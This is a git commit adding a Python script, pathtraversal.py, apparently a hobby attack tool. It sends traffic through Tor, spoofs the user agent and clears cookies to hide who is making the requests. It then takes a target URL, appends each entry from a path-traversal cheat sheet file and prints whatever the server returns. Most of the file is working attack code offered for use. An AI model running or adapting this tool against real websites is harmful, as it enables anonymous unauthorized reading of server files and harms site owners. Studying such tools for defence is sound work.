8e26a2db02eedc80f9881b6a507cf75e4cc919f4
Claudia Lorusso <38263840+claudialorusso@users.noreply.github.com>
2022-03-30 18:46:25 +0200

    Add files via upload

---
+++ pathtraversal.py
@@ -0,0 +1,67 @@
+import requests
+
+#setting up an empty session
+session = requests.session()
+session.proxies = {}
+
+#way to access DO NOT USE requests use session like this:
+#r = session.get('https://jasonrigden.com')
+
+#check current IP
+r = session.get("http://httpbin.org/ip")
+print("The following is your REAL IP:\n", r.text, "\n")
+
+#I create a new Session Object and add my proxies
+#in order to change IP
+session = requests.session()
+session.proxies = {}
+
+session.proxies["http"] = "socks5h://localhost:9050"
+session.proxies["https"] = "socks5h://localhost:9050"
+
+r = session.get("http://httpbin.org/ip")
+print("The following is your NEW IP:\n", r.text, "\n")
+#if it doesn't work just restart tor using: sudo service tor restart
+
+#current user agent
+#it will show versions info, that we are accesing through python script
+r = session.get("https://httpbin.org/user-agent")
+print("Current User Agent:\n",r.text)
+
+#we must createw some request headers and change the User-agent
+headers = {}
+headers['User-agent'] = "HotJava/1.1.2 FCS"
+#we include the headers in the request
+r = session.get("https://httpbin.org/user-agent", headers=headers)
+print("New user agent:\n", r.text)
+
+#we now must kill the cookies!!!!
+#first I check them
+session.get('http://httpbin.org/cookies/set/sessioncookie/Hello')
+r = session.get("http://httpbin.org/cookies")
+print("My cookies:\n",r.text)
+
+#KILL EM!!!!!!
+
+session.cookies.clear()
+r = session.get("http://httpbin.org/cookies")
+print("My NEW cookies:\n",r.text)
+
+print("ALL SETTED UP FOR YOU :)\n\n")
+
+url_input = input("Enter URL:\t")
+
+with open ("pathtraversal_cheatsheet") as f:
+    cheet_sheet = f.readlines()
+
+for cheet in cheet_sheet:
+    url=url_input+cheet
+    print("Trying with:\t", url, "\n")
+    r = session.get(url)
+    print("--------------------------OUTPUT:\n", r.text)
+    exit = input("Continue? (type 'Y' or 'Yes' or 'yes' or 'y' or 'YES' to continue)\t")
+    if (exit!="Y" and exit!="Yes" and exit!="yes" and exit!="y" and exit!="YES"):
+        print("The end!\n")
+        break
+
+print("BYE")
